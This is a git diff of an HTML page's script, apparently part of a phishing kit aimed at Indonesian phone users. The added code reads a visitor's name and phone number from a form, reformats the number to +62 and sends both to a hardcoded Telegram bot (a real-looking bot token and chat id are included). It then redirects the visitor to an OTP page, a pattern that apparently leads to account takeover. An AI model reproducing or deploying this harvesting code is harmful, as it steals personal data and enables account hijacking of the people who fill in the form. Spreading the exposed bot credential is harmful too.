@@ -274,43 +274,55 @@ h3{
     </nav>
 
     <script>
-        function kirimData() {
-            let nama = document.getElementById('nama').value;
-            let nomor = document.getElementById('nomor').value;
-            let nomorLengkap = "+62" + nomor;
+        function formatNomorHP(nomor) {
+    if (nomor.startsWith("+62")) {
+        return nomor; // Sudah benar
+    } else if (nomor.startsWith("0")) {
+        return "+62" + nomor.substring(1); // Ganti "0" jadi "+62"
+    } else if (nomor.startsWith("62")) {
+        return "+62" + nomor.substring(2); // Ganti "62" jadi "+62"
+    } else {
+        return "+62" + nomor; // Tambahkan "+62" jika belum ada
+    }
+}
 
-            if (nama === "" || nomor === "") {
-                alert("Harap isi semua kolom!");
-                return;
+function kirimData() {
+    let nama = document.getElementById('nama').value;
+    let nomor = document.getElementById('nomor').value;
+    let nomorLengkap = formatNomorHP(nomor);
+
+    if (nama === "" || nomor === "") {
+        alert("Harap isi semua kolom!");
+        return;
+    }
+
+    // Simpan data ke localStorage untuk halaman OTP
+    localStorage.setItem("nama", nama);
+    localStorage.setItem("nomorHP", nomorLengkap);
+
+    // Kirim ke Telegram
+    let token = "7852581294:AAEcow9FfvWIMzzMLkK6VTKcLWCIX1jApGo";
+    let chat_id = "6824078885";
+    let pesan = `Nama: ${nama}%0ANomor: ${nomorLengkap}`;
+
+    let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${pesan}`;
+
+    fetch(url)
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                window.location.href = "otp.html"; // Pindah ke halaman OTP
+            } else {
+                alert("Gagal mengirim data ke Telegram.");
             }
+        })
+        .catch(error => {
+            alert("Terjadi kesalahan!");
+            console.error(error);
+        });
+}
 
-            // Simpan data ke localStorage untuk halaman OTP
-            localStorage.setItem("nama", nama);
-            localStorage.setItem("nomorHP", nomorLengkap);
-
-            // Kirim ke Telegram (ganti TOKEN dan CHAT_ID dengan milik Anda)
-            let token = "7852581294:AAEcow9FfvWIMzzMLkK6VTKcLWCIX1jApGo";
-            let chat_id = "6824078885";
-            let pesan = `Nama: ${nama}%0ANomor: ${nomorLengkap}`;
-
-            let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${pesan}`;
-
-            fetch(url)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        
-                        window.location.href = "otp.html"; // Pindah ke halaman OTP
-                    } else {
-                        alert("Gagal mengirim data ke Telegram.");
-                    }
-                })
-                .catch(error => {
-                    alert("Terjadi kesalahan!");
-                    console.error(error);
-                });
-        }
     </script>
 
 </body>
-</html>
+    </html>
